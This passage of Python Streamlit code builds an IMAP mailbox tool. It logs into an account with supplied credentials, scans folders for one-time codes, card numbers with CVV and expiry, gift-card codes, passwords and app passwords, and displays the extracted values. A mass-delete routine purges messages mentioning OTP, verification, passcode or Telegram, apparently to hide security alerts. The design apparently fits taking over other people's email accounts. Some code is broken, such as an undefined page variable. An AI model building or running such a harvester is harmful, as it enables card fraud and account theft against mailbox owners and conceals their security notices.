                st.session_state.current_messages = fetch_messages_paginated(
                    mail, active_email, active_password, host, [folder], 
                    mode="FOLDER_ONLY",
                    page_size=page_size, page_number=st.session_state.current_page, sort_order=sort_order,
                    log_target="DEBUG"
                )
                save_session_cache()
                st.rerun()

# Standalone OTP / Debit / Sensitive Data Scanner
st.markdown("---")
with st.expander("🔑 Standalone OTP, Debit/Credit Cards & Sensitive Data Scanner", expanded=False):
    st.markdown("#### Dynamic OTP, Password, Debit & Credit Cards, Gift Cards, Telegram & Credential Scanner Controls")
    
    otp_c1, otp_c2, otp_c3 = st.columns([2, 1, 1])
    otp_folder_options = ["INBOX"] + [f for f in st.session_state.mb_folders if f != "INBOX"]
    
    with otp_c1:
        otp_scope_choice = st.multiselect("Target Folder Scope", otp_folder_options, default=["INBOX"], key="otp_scan_scope")
    with otp_c2:
        category_options = [
            "All Security Categories", "Debit Card & Credit Card Details", "Bank Debit Alert & Online Debit",
            "Order Tracking & Purchase Confirmation", "OTP Message & Verification", "Telegram Alerts & Blacklist",
            "Password / Reset Code", "Gift Cards", "ID Cards / Credentials", "Application Passwords", "Login Info / Info"
        ]
        otp_scan_category = st.multiselect("Target Data Type Dropdown", category_options, default=["All Security Categories"], key="otp_category_select")
    with otp_c3:
        otp_search_field = st.selectbox("Scan Field", ["TEXT", "SUBJECT", "BODY", "FROM"], key="otp_search_field")

    otp_page_size = st.slider("OTP Scanner Results Page Size", 5, 200, 15, key="otp_page_size_slider")

    t_col1, t_col2 = st.columns(2)
    with t_col1:
        otp_auto_clean_toggle = st.toggle("Auto-Clean HTML & Boilerplate", value=True, key="otp_clean_toggle")
    with t_col2:
        otp_deep_regex_chk = st.checkbox("Enable Deep Regex Code, Debit & Credit Card Extraction", value=True, key="otp_regex_chk")

    preset_keywords_map = {
        "All Security Categories": "OTP password debit credit card gift payment credential login verification reset order tracking confirmation telegram blacklist banned",
        "Debit Card & Credit Card Details": "debit card credit card cardholder cvv cvc exp expiry cardholder payment",
        "Bank Debit Alert & Online Debit": "bank debit online purchase debited debit alert account debited transaction paid",
        "Order Tracking & Purchase Confirmation": "order tracking tracking number purchase order order confirmation PO tracking",
        "OTP Message & Verification": "OTP verification code verify auth token pin",
        "Telegram Alerts & Blacklist": "telegram tg t.me blacklist blacklisted banned blocked spam",
        "Password / Reset Code": "password reset passwd new password",
        "Gift Cards": "gift card claim code voucher redeem",
        "ID Cards / Credentials": "id card identity credentials account info",
        "Application Passwords": "app password application password token secret",
        "Login Info / Info": "login details signin info account access"
    }

    otp_custom_keyword = st.text_input("Custom Keyword Override (Optional)", key="otp_custom_kw")
    otp_blacklist_input = st.text_input("Blacklist Keywords (comma-separated)", value="Telegram, spam, scam, promo", key="otp_blacklist_kw")

    if st.button("🚀 Execute Dedicated Security Scan", type="primary", use_container_width=True, key="otp_exec_btn"):
        domain_lower = active_email.split("@")[-1].lower() if "@" in active_email else ""
        default_hosts = host_list(active_email)
        if st.session_state.app_config.get("auto_fallback_probing", True):
            if "charter" in domain_lower:
                default_hosts = ["mobile.charter.net", "imap.charter.net"] + default_hosts
            elif "spectrum" in domain_lower:
                default_hosts = ["imap.spectrum.net", "mail.spectrum.net"] + default_hosts
            elif "twc" in domain_lower:
                default_hosts = ["mail.twc.com"] + default_hosts
        host = override or st.session_state.mb_host or (default_hosts[:1] or [""])[0]
        if not active_email or not active_password or not host:
            st.error("Please connect and discover folders first.")
        elif not otp_scope_choice:
            st.warning("Please select at least one folder from Target Folder Scope.")
        else:
            try:
                target_scope = otp_scope_choice
                if otp_custom_keyword.strip():
                    kw_to_use = otp_custom_keyword.strip()
                else:
                    selected_kws = [preset_keywords_map[cat] for cat in otp_scan_category if cat in preset_keywords_map]
                    kw_to_use = " ".join(selected_kws) if selected_kws else "card OTP debit telegram blacklist"

                with st.spinner(f"Scanning target folders ({len(target_scope)}) for security payload [{kw_to_use}]..."):
                    mail = get_active_mail(active_email, active_password, host)
                    msgs = fetch_messages_paginated(
                        mail, active_email, active_password, host, target_scope, kw_to_use, otp_search_field,
                        mode="SEARCH", page_size=otp_page_size, page_number=1, sort_order=sort_order,
                        log_target="OTP"
                    )
                    st.session_state.otp_messages = msgs
                    st.session_state.otp_current_page = 1
                    save_session_cache()
                    otp_log(f"Scan complete. Retrieved {st.session_state.otp_total_matched_count} matching messages.")
            except Exception as e:
                st.error(str(e))

    st.markdown("#### 🔒 Standalone Security & Card Message Stream")
    otp_msgs = [m for m in st.session_state.otp_messages if not should_blacklist_message(m, otp_blacklist_input)]
    otp_total = len(otp_msgs)

    if len(otp_msgs) > 0:
        otp_total_pages = max(1, math.ceil(otp_total / otp_page_size))
        otp_curr_p = st.session_state.otp_current_page
        
        st.markdown(f"**Showing Page {otp_curr_p} of {otp_total_pages} (Total Security Matches: {otp_total})**")

        for idx, msg in enumerate(otp_msgs):
            status_icon = "📖" if msg["is_read"] else "📩"
            cat_list = msg.get("categories", [])
            cat_badge = f" [{' '.join(cat_list)}]" if cat_list else ""
            folder_badge = f" [{msg['folder']}]"

            with st.expander(f"{status_icon}{folder_badge} [{msg['date']}] {msg['from']} - {msg['subject']}{cat_badge}", expanded=False):
                st.write(f"**Folder:** {msg['folder']}")
                st.write(f"**From:** {msg['from']}")
                st.write(f"**To:** {msg['to']}")
                st.write(f"**Subject:** {msg['subject']}")
                st.write(f"**Date:** {msg['date']}")
                st.write(f"**IMAP Message ID:** {msg['id']} | **Size:** {msg['size_bytes']} bytes")

                if msg.get("categories"):
                    st.info(f"🏷️ **Detected Classifications:** {' | '.join(msg['categories'])}")
                if msg["pins"]:
                    st.success(f"🔑 **Extracted PINs / Verification Codes / OTPs:** {', '.join(msg['pins'])}")
                if msg.get("cards"):
                    st.warning(f"💳 **Detected Debit, Credit Card & Purchase Details:** {', '.join(msg['cards'])}")
                if msg.get("creds"):
                    st.info(f"🔒 **Extracted Passwords / Credentials / App Passwords:** {', '.join(msg['creds'])}")
                if msg["links"]:
                    st.markdown("🔗 **Actionable Verification Links:**")
                    for link in msg["links"]:
                        st.markdown(f"- [{link}]({link})", unsafe_allow_html=True)

                st.markdown("---")
                display_body = msg["body"] if otp_auto_clean_toggle else msg["body"]
                st.text_area("Message Payload Body", value=display_body, height=150, key=f"otp_b_{msg['folder']}_{msg['id']}_{idx}")

                o_col1, o_col2, o_col3, o_col4 = st.columns(4)
                domain_lower = active_email.split("@")[-1].lower() if "@" in active_email else ""
                default_hosts = host_list(active_email)
                if st.session_state.app_config.get("auto_fallback_probing", True):
                    if "charter" in domain_lower:
                        default_hosts = ["mobile.charter.net", "imap.charter.net"] + default_hosts
                    elif "spectrum" in domain_lower:
                        default_hosts = ["imap.spectrum.net", "mail.spectrum.net"] + default_hosts
                    elif "twc" in domain_lower:
                        default_hosts = ["mail.twc.com"] + default_hosts
                host = override or st.session_state.mb_host or (default_hosts[:1] or [""])[0]
                real_imap_folder = get_imap_path(msg['folder'])
                real_imap_encoded = encode_imap_utf7(real_imap_folder)

                with o_col1:
                    if not msg["is_read"]:
                        if st.button("Mark as Read", key=f"otp_read_{msg['folder']}_{msg['id']}_{idx}"):
                            try:
                                m_client = get_active_mail(active_email, active_password, host)
                                m_client.select(f'"{real_imap_encoded}"', readonly=False)
                                m_client.store(msg["id"], '+FLAGS', '\\Seen')
                                msg["is_read"] = True
                                save_session_cache()
                                st.success("Marked as read!")
                                st.rerun()
                            except Exception as ex:
                                st.error(str(ex))

                with o_col2:
                    otp_mv_target = st.selectbox("Move to", st.session_state.mb_folders, key=f"otp_mv_sel_{msg['folder']}_{msg['id']}_{idx}")
                    if st.button("Move Message", key=f"otp_mv_btn_{msg['folder']}_{msg['id']}_{idx}"):
                        try:
                            real_target_path = get_imap_path(otp_mv_target)
                            real_target_encoded = encode_imap_utf7(real_target_path)
                            m_client = get_active_mail(active_email, active_password, host)
                            m_client.select(f'"{real_target_encoded}"', readonly=False)
                            m_client.copy(msg["id"], f'"{real_target_encoded}"')
                            m_client.store(msg["id"], '+FLAGS', '\\Deleted')
                            m_client.expunge()
                            st.session_state.otp_messages.remove(msg)
                            save_session_cache()
                            st.success(f"Moved to {otp_mv_target}!")
                            st.rerun()
                        except Exception as ex:
                            st.error(str(ex))

                with o_col3:
                    if st.button("Delete Message", key=f"otp_del_{msg['folder']}_{msg['id']}_{idx}", type="primary"):
                        try:
                            m_client = get_active_mail(active_email, active_password, host)
                            m_client.select(f'"{real_imap_encoded}"', readonly=False)
                            m_client.store(msg["id"], '+FLAGS', '\\Deleted')
                            m_client.expunge()
                            st.session_state.otp_messages.remove(msg)
                            save_session_cache()
                            st.success("Deleted message!")
                            st.rerun()
                        except Exception as ex:
                            st.error(str(ex))

                with o_col4:
                    with st.popover("View Raw RFC822"):
                        st.code(msg.get("raw", b"").decode("utf-8", errors="ignore"))

        st.markdown("---")
        op_c1, op_c2, op_c3 = st.columns([1, 2, 1])

        with op_c1:
            if st.button("Previous Page", disabled=(otp_curr_p <= 1), use_container_width=True, key="otp_prev_pg"):
                st.session_state.otp_current_page -= 1
                domain_lower = active_email.split("@")[-1].lower() if "@" in active_email else ""
                default_hosts = host_list(active_email)
                if st.session_state.app_config.get("auto_fallback_probing", True):
                    if "charter" in domain_lower:
                        default_hosts = ["mobile.charter.net", "imap.charter.net"] + default_hosts
                    elif "spectrum" in domain_lower:
                        default_hosts = ["imap.spectrum.net", "mail.spectrum.net"] + default_hosts
                    elif "twc" in domain_lower:
                        default_hosts = ["mail.twc.com"] + default_hosts
                host = override or st.session_state.mb_host or (default_hosts[:1] or [""])[0]
                mail = get_active_mail(active_email, active_password, host)
                target_scope = otp_scope_choice if otp_scope_choice else [folder]
                if otp_custom_keyword.strip():
                    kw_to_use = otp_custom_keyword.strip()
                else:
                    selected_kws = [preset_keywords_map[cat] for cat in otp_scan_category if cat in preset_keywords_map]
                    kw_to_use = " ".join(selected_kws) if selected_kws else "card OTP debit telegram blacklist"
                st.session_state.otp_messages = fetch_messages_paginated(
                    mail, active_email, active_password, host, target_scope, kw_to_use, otp_search_field, 
                    mode="SEARCH", page_size=otp_page_size, page_number=st.session_state.otp_current_page, 
                    sort_order=sort_order, log_target="OTP"
                )
                save_session_cache()
                st.rerun()

        with op_c2:
            st.markdown(f"<h4 style='text-align: center; margin: 0;'>Page {otp_curr_p} of {otp_total_pages}</h4>", unsafe_allow_html=True)

        with op_c3:
            if st.button("Next Page", disabled=(otp_curr_p >= otp_total_pages), use_container_width=True, key="otp_next_pg"):
                st.session_state.otp_current_page += 1
                domain_lower = active_email.split("@")[-1].lower() if "@" in active_email else ""
                default_hosts = host_list(active_email)
                if st.session_state.app_config.get("auto_fallback_probing", True):
                    if "charter" in domain_lower:
                        default_hosts = ["mobile.charter.net", "imap.charter.net"] + default_hosts
                    elif "spectrum" in domain_lower:
                        default_hosts = ["imap.spectrum.net", "mail.spectrum.net"] + default_hosts
                    elif "twc" in domain_lower:
                        default_hosts = ["mail.twc.com"] + default_hosts
                host = override or st.session_state.mb_host or (default_hosts[:1] or [""])[0]
                mail = get_active_mail(active_email, active_password, host)
                target_scope = otp_scope_choice if otp_scope_choice else [folder]
                if otp_custom_keyword.strip():
                    kw_to_use = otp_custom_keyword.strip()
                else:
                    selected_kws = [preset_keywords_map[cat] for cat in otp_scan_category if cat in preset_keywords_map]
                    kw_to_use = " ".join(selected_kws) if selected_kws else "card OTP debit telegram blacklist"
                st.session_state.otp_messages = fetch_messages_paginated(
                    mail, active_email, active_password, host, target_scope, kw_to_use, otp_search_field, 
                    mode="SEARCH", page_size=otp_page_size, page_number=st.session_state.otp_current_page, 
                    sort_order=sort_order, log_target="OTP"
                )
                save_session_cache()
                st.rerun()
    else:
        st.caption("No security messages scanned yet. Select categories or keywords and click 'Execute Dedicated Security Scan'.")

    st.markdown("#### 🛠️ OTP Engine Debugging & Diagnose Log Screen")
    with st.expander("🔐 OTP Scanner IMAP Diagnostic Traces & Logs", expanded=False):
        if st.session_state.otp_diag_logs:
            st.code("\n".join(st.session_state.otp_diag_logs), language="text")
        else:
            st.caption("OTP scanner traces and raw server logs will appear here during execution.")

# Deep Keyword Search & Scope Filters
st.markdown("---")
with st.expander("🔍 Deep Keyword Search & Scope Filters", expanded=False):
    s_col1, s_col2 = st.columns([1, 1])
    search_scope_options = ["INBOX"] + [f for f in st.session_state.mb_folders if f != "INBOX"]
    
    with s_col1:
        search_scope_choice = st.multiselect("Search Scope Option", search_scope_options, default=["INBOX"], key="deep_search_scope")
    with s_col2:
        search_field_choice = st.selectbox("Search Field Option", ["TEXT", "SUBJECT", "BODY", "FROM"], key="deep_search_field")
    
    search_query_input = st.text_input("Search term or keyword", key="deep_search_query")
    search_blacklist_input = st.text_input("Blacklist Keywords (comma-separated)", value="Telegram, spam, scam, promo", key="deep_search_blacklist_kw")
    
    search_page_size = st.slider("Search Results Page Size", 5, 200, 15, key="search_page_size_slider")
    
    if st.button("🔍 Execute Keyword Search", type="primary", use_container_width=True, key="deep_search_btn"):
        domain_lower = active_email.split("@")[-1].lower() if "@" in active_email else ""
        default_hosts = host_list(active_email)
        if st.session_state.app_config.get("auto_fallback_probing", True):
            if "charter" in domain_lower:
                default_hosts = ["mobile.charter.net", "imap.charter.net"] + default_hosts
            elif "spectrum" in domain_lower:
                default_hosts = ["imap.spectrum.net", "mail.spectrum.net"] + default_hosts
            elif "twc" in domain_lower:
                default_hosts = ["mail.twc.com"] + default_hosts
        host = override or st.session_state.mb_host or (default_hosts[:1] or [""])[0]
        if not active_email or not active_password or not host:
            st.error("Please connect and load folders first.")
        elif not search_query_input.strip():
            st.warning("Please enter a keyword or search term.")
        elif not search_scope_choice:
            st.warning("Please select at least one folder for Search Scope Option.")
        else:
            try:
                target_scope = search_scope_choice
                with st.spinner(f"Scanning target mailboxes ({len(target_scope)} folder/s) for [{search_field_choice}: '{search_query_input.strip()}']..."):
                    mail = get_active_mail(active_email, active_password, host)
                    msgs = fetch_messages_paginated(
                        mail, active_email, active_password, host, target_scope, search_query_input, search_field_choice, 
                        mode="SEARCH", page_size=search_page_size, page_number=1, sort_order=sort_order,
                        log_target="SEARCH"
                    )
                    st.session_state.search_messages = msgs
                    st.session_state.search_current_page = 1
                    save_session_cache()
                    log(f"Search found {st.session_state.search_total_matched_count} total matches across target scope.")
            except Exception as e:
                st.error(str(e))

    st.markdown("#### ✉️ Search Results Message Stream")
    search_msgs = [m for m in st.session_state.search_messages if not should_blacklist_message(m, search_blacklist_input)]
    search_total_msgs = len(search_msgs)

    if len(search_msgs) > 0:
        search_total_pages = max(1, math.ceil(search_total_msgs / search_page_size))
        search_curr_p = st.session_state.search_current_page
        
        st.markdown(f"**Showing Page {search_curr_p} of {search_total_pages} (Total Matches Found: {search_total_msgs})**")

        for idx, msg in enumerate(search_msgs):
            status_icon = "📖" if msg["is_read"] else "📩"
            cat_list = msg.get("categories", [])
            cat_badge = f" [{' '.join(cat_list)}]" if cat_list else ""
            folder_badge = f" [{msg['folder']}]"

            with st.expander(f"{status_icon}{folder_badge} [{msg['date']}] {msg['from']} - {msg['subject']}{cat_badge}", expanded=False):
                st.write(f"**Folder:** {msg['folder']}")
                st.write(f"**From:** {msg['from']}")
                st.write(f"**To:** {msg['to']}")
                st.write(f"**Subject:** {msg['subject']}")
                st.write(f"**Date:** {msg['date']}")
                st.write(f"**IMAP Message ID:** {msg['id']} | **Size:** {msg['size_bytes']} bytes")

                if msg.get("categories"):
                    st.info(f"🏷️ **Detected Classifications:** {' | '.join(msg['categories'])}")
                if msg["pins"]:
                    st.success(f"🔑 **Extracted PINs / Verification Codes:** {', '.join(msg['pins'])}")
                if msg["links"]:
                    st.markdown("🔗 **Actionable Verification Links:**")
                    for link in msg["links"]:
                        st.markdown(f"- [{link}]({link})", unsafe_allow_html=True)

                st.markdown("---")
                st.text_area("Cleaned Message Body", value=msg["body"], height=150, key=f"s_body_{msg['folder']}_{msg['id']}_{idx}")

                s_op1, s_op2, s_op3, s_op4 = st.columns(4)
                domain_lower = active_email.split("@")[-1].lower() if "@" in active_email else ""
                default_hosts = host_list(active_email)
                if st.session_state.app_config.get("auto_fallback_probing", True):
                    if "charter" in domain_lower:
                        default_hosts = ["mobile.charter.net", "imap.charter.net"] + default_hosts
                    elif "spectrum" in domain_lower:
                        default_hosts = ["imap.spectrum.net", "mail.spectrum.net"] + default_hosts
                    elif "twc" in domain_lower:
                        default_hosts = ["mail.twc.com"] + default_hosts
                host = override or st.session_state.mb_host or (default_hosts[:1] or [""])[0]
                real_imap_folder = get_imap_path(msg['folder'])
                real_imap_encoded = encode_imap_utf7(real_imap_folder)

                with s_op1:
                    if not msg["is_read"]:
                        if st.button("Mark as Read", key=f"s_read_{msg['folder']}_{msg['id']}_{idx}"):
                            try:
                                m_client = get_active_mail(active_email, active_password, host)
                                m_client.select(f'"{real_imap_encoded}"', readonly=False)
                                m_client.store(msg["id"], '+FLAGS', '\\Seen')
                                msg["is_read"] = True
                                save_session_cache()
                                st.success("Marked as read!")
                                st.rerun()
                            except Exception as ex:
                                st.error(str(ex))

                with s_op2:
                    s_target_move = st.selectbox("Move to", st.session_state.mb_folders, key=f"s_mv_sel_{msg['folder']}_{msg['id']}_{idx}")
                    if st.button("Move Message", key=f"s_mv_btn_{msg['folder']}_{msg['id']}_{idx}"):
                        try:
                            real_target_path = get_imap_path(s_target_move)
                            real_target_encoded = encode_imap_utf7(real_target_path)
                            m_client = get_active_mail(active_email, active_password, host)
                            m_client.select(f'"{real_target_encoded}"', readonly=False)
                            m_client.copy(msg["id"], f'"{real_target_encoded}"')
                            m_client.store(msg["id"], '+FLAGS', '\\Deleted')
                            m_client.expunge()
                            st.session_state.search_messages.remove(msg)
                            save_session_cache()
                            st.success(f"Moved to {s_target_move}!")
                            st.rerun()
                        except Exception as ex:
                            st.error(str(ex))

                with s_op3:
                    s_del_label = "Delete Bot Msg" if msg["is_bot"] else "Delete Message"
                    if st.button(s_del_label, key=f"s_del_{msg['folder']}_{msg['id']}_{idx}", type="primary" if msg["is_bot"] else "secondary"):
                        try:
                            m_client = get_active_mail(active_email, active_password, host)
                            m_client.select(f'"{real_imap_encoded}"', readonly=False)
                            m_client.store(msg["id"], '+FLAGS', '\\Deleted')
                            m_client.expunge()
                            st.session_state.search_messages.remove(msg)
                            save_session_cache()
                            st.success("Deleted message!")
                            st.rerun()
                        except Exception as ex:
                            st.error(str(ex))

                with s_op4:
                    with st.popover("View Raw RFC822"):
                        st.code(msg.get("raw", b"").decode("utf-8", errors="ignore"))

        st.markdown("---")
        sp_col1, sp_col2, sp_col3 = st.columns([1, 2, 1])

        with sp_col1:
            if st.button("Previous Page", disabled=(search_curr_p <= 1), use_container_width=True, key="s_prev_pg"):
                st.session_state.search_current_page -= 1
                domain_lower = active_email.split("@")[-1].lower() if "@" in active_email else ""
                default_hosts = host_list(active_email)
                if st.session_state.app_config.get("auto_fallback_probing", True):
                    if "charter" in domain_lower:
                        default_hosts = ["mobile.charter.net", "imap.charter.net"] + default_hosts
                    elif "spectrum" in domain_lower:
                        default_hosts = ["imap.spectrum.net", "mail.spectrum.net"] + default_hosts
                    elif "twc" in domain_lower:
                        default_hosts = ["mail.twc.com"] + default_hosts
                host = override or st.session_state.mb_host or (default_hosts[:1] or [""])[0]
                mail = get_active_mail(active_email, active_password, host)
                target_scope = search_scope_choice if search_scope_choice else [folder]
                st.session_state.search_messages = fetch_messages_paginated(
                    mail, active_email, active_password, host, target_scope, search_query_input, search_field_choice, 
                    mode="SEARCH", page_size=search_page_size, page_number=st.session_state.search_current_page, 
                    sort_order=sort_order, log_target="SEARCH"
                )
                save_session_cache()
                st.rerun()

        with sp_col2:
            st.markdown(f"<h4 style='text-align: center; margin: 0;'>Page {search_curr_p} of {search_total_pages}</h4>", unsafe_allow_html=True)

        with sp_col3:
            if st.button("Next Page", disabled=(search_curr_p >= search_total_pages), use_container_width=True, key="s_next_pg"):
                st.session_state.search_current_page += 1
                domain_lower = active_email.split("@")[-1].lower() if "@" in active_email else ""
                default_hosts = host_list(active_email)
                if st.session_state.app_config.get("auto_fallback_probing", True):
                    if "charter" in domain_lower:
                        default_hosts = ["mobile.charter.net", "imap.charter.net"] + default_hosts
                    elif "spectrum" in domain_lower:
                        default_hosts = ["imap.spectrum.net", "mail.spectrum.net"] + default_hosts
                    elif "twc" in domain_lower:
                        default_hosts = ["mail.twc.com"] + default_hosts
                host = override or st.session_state.mb_host or (default_hosts[:1] or [""])[0]
                mail = get_active_mail(active_email, active_password, host)
                target_scope = search_scope_choice if search_scope_choice else [folder]
                st.session_state.search_messages = fetch_messages_paginated(
                    mail, active_email, active_password, host, target_scope, search_query_input, search_field_choice, 
                    mode="SEARCH", page_size=search_page_size, page_number=st.session_state.search_current_page, 
                    sort_order=sort_order, log_target="SEARCH"
                )
                save_session_cache()
                st.rerun()
    else:
        st.caption("No search results loaded yet. Enter a query and click 'Execute Keyword Search'.")

    st.markdown("#### 🛠️ Deep Search Debugging & Diagnostic Log Screen")
    with st.expander("🔍 Search Engine IMAP Diagnostic Traces & Logs", expanded=False):
        if st.session_state.search_diag_logs:
            st.code("\n".join(st.session_state.search_diag_logs), language="text")
        else:
            st.caption("Search engine logs will be recorded here after executing a keyword search.")

# Mass Bot Purge & Intelligence Hub
st.markdown("---")
with st.expander("🤖 Mass Bot Purge & Intelligence Hub", expanded=False):
    all_loaded_bot_msgs = [m for m in st.session_state.current_messages if m["is_bot"]]
    
    bot_col1, bot_col2 = st.columns([2, 1])
    bot_scope_options = ["INBOX"] + [f for f in st.session_state.mb_folders if f != "INBOX"]
    
    with bot_col1:
        bot_target_folder = st.multiselect("Select Bot Target Scope", bot_scope_options, default=["INBOX"], key="bot_hub_folder_select")
    with bot_col2:
        bot_scan_limit = st.selectbox("Bot Scan Depth", [50, 100, 200, 500], index=1)

    bot_page_size = st.slider("Bot Stream Results Page Size", 5, 200, 15, key="bot_page_size_slider")

    b_act1, b_act2 = st.columns(2)
    with b_act1:
        if st.button("🔍 Scan Folder For Bot/OTP/Telegram Messages", use_container_width=True):
            domain_lower = active_email.split("@")[-1].lower() if "@" in active_email else ""
            default_hosts = host_list(active_email)
            if st.session_state.app_config.get("auto_fallback_probing", True):
                if "charter" in domain_lower:
                    default_hosts = ["mobile.charter.net", "imap.charter.net"] + default_hosts
                elif "spectrum" in domain_lower:
                    default_hosts = ["imap.spectrum.net", "mail.spectrum.net"] + default_hosts
                elif "twc" in domain_lower:
                    default_hosts = ["mail.twc.com"] + default_hosts
            host = override or st.session_state.mb_host or (default_hosts[:1] or [""])[0]
            if not active_email or not active_password or not host:
                st.error("Please connect first.")
            elif not bot_target_folder:
                st.warning("Please select at least one folder for Bot Target Scope.")
            else:
                try:
                    target_scope = bot_target_folder
                    with st.spinner("Scanning target folders for bot & Telegram intelligence..."):
                        mail = get_active_mail(active_email, active_password, host)
                        msgs = fetch_messages_paginated(
                            mail, active_email, active_password, host, target_scope, mode="FOLDER_ONLY",
                            page_size=bot_scan_limit, page_number=1, sort_order="Newest First",
                            log_target="DEBUG"
                        )
                        st.session_state.current_messages = msgs
                        st.session_state.bot_filter_mode = True
                        st.session_state.bot_current_page = 1
                        save_session_cache()
                        st.success("Scan complete. Displaying detected bot/Telegram messages.")
                except Exception as ex:
                    st.error(str(ex))

    with b_act2:
        if st.button("🚨 Mass Delete All Detected Bot Messages", type="primary", use_container_width=True):
            if not all_loaded_bot_msgs:
                st.warning("No bot messages detected in current loaded stream to delete.")
            else:
                st.session_state.bot_diag_logs = []
                domain_lower = active_email.split("@")[-1].lower() if "@" in active_email else ""
                default_hosts = host_list(active_email)
                if st.session_state.app_config.get("auto_fallback_probing", True):
                    if "charter" in domain_lower:
                        default_hosts = ["mobile.charter.net", "imap.charter.net"] + default_hosts
                    elif "spectrum" in domain_lower:
                        default_hosts = ["imap.spectrum.net", "mail.spectrum.net"] + default_hosts
                    elif "twc" in domain_lower:
                        default_hosts = ["mail.twc.com"] + default_hosts
                host = override or st.session_state.mb_host or (default_hosts[:1] or [""])[0]
                try:
                    bot_log("🤖 [BOT ENGINE DIAGNOSTIC START] Initializing Mass Deletion Sequence...")
                    mail = get_active_mail(active_email, active_password, host)
                    deleted_count = 0
                    
                    folders = sorted({bm["folder"] for bm in all_loaded_bot_msgs}) or [folder]
                    terms = ["telegram", "otp", "verification", "passcode", "bot"]
                    for r_folder in folders:
                        r_encoded = encode_imap_utf7(get_imap_path(r_folder))
                        mail.select(f'"{r_encoded}"', readonly=False)
                        found = set()
                        for term in terms:
                            typ, data = mail.search(None, "TEXT", term)
                            if typ == "OK" and data and data[0]:
                                found.update((data[0] or b"").split())
                        for mid in found:
                            mail.store(mid, "+FLAGS", '\\Deleted')
                            deleted_count += 1
                        mail.expunge()

                    bot_log(f"🏁 [MASS DELETE COMPLETE] Successfully purged {deleted_count} bot messages from server.")
                    st.success(f"Successfully deleted {deleted_count} bot messages!")
                    st.session_state.current_messages = [m for m in st.session_state.current_messages if not m["is_bot"]]
                    st.session_state.bot_filter_mode = False
                    save_session_cache()
                    st.rerun()
                except Exception as e:
                    bot_log(f"❌ [MASS DELETE EXCEPTION]: {e}")
                    st.error(f"Error during mass delete: {e}")

    st.markdown("#### 📱 Detected Bot Message Preview Screen")
    if all_loaded_bot_msgs:
        bot_total_pages = max(1, math.ceil(len(all_loaded_bot_msgs) / bot_page_size))
        bot_curr_p = min(st.session_state.bot_current_page, bot_total_pages)
        st.session_state.bot_current_page = bot_curr_p
        
        start_idx = (bot_curr_p - 1) * bot_page_size
        end_idx = start_idx + bot_page_size
        paged_bot_msgs = all_loaded_bot_msgs[start_idx:end_idx]

        st.markdown(f"**Showing Bot Page {bot_curr_p} of {bot_total_pages} ({len(all_loaded_bot_msgs)} Total Detected Bots)**")

        for idx, bm in enumerate(paged_bot_msgs, start_idx + 1):
            st.markdown(f"**[{idx}] [{bm['folder']}]** `{bm['from']}` — **{bm['subject']}** (ID: `{bm['id']}`) ")
            if bm["pins"]:
                st.info(f"🔑 PINs detected: {', '.join(bm['pins'])}")

        st.markdown("---")
        bp_c1, bp_c2, bp_c3 = st.columns([1, 2, 1])
        with bp_c1:
            if st.button("Previous Bot Page", disabled=(bot_curr_p <= 1), use_container_width=True, key="bot_prev_pg"):
                st.session_state.bot_current_page -= 1
                save_session_cache()
                st.rerun()
        with bp_c2:
            st.markdown(f"<h4 style='text-align: center; margin: 0;'>Page {bot_curr_p} of {total_pages}</h4>", unsafe_allow_html=True)
        with bp_c3:
            if st.button("Next Bot Page", disabled=(bot_curr_p >= total_pages), use_container_width=True, key="bot_next_pg"):
                st.session_state.bot_current_page += 1
                save_session_cache()
                st.rerun()
    else:
        st.caption("No bot messages currently loaded in session memory.")

    st.markdown("#### 🛠️ Mass Bot Delete Diagnostic & Diagnose Log Screen")
    if st.session_state.bot_diag_logs:
        st.code("\n".join(st.session_state.bot_diag_logs), language="text")
    else:
        st.caption("Bot engine traces will be printed here during purge operations.")
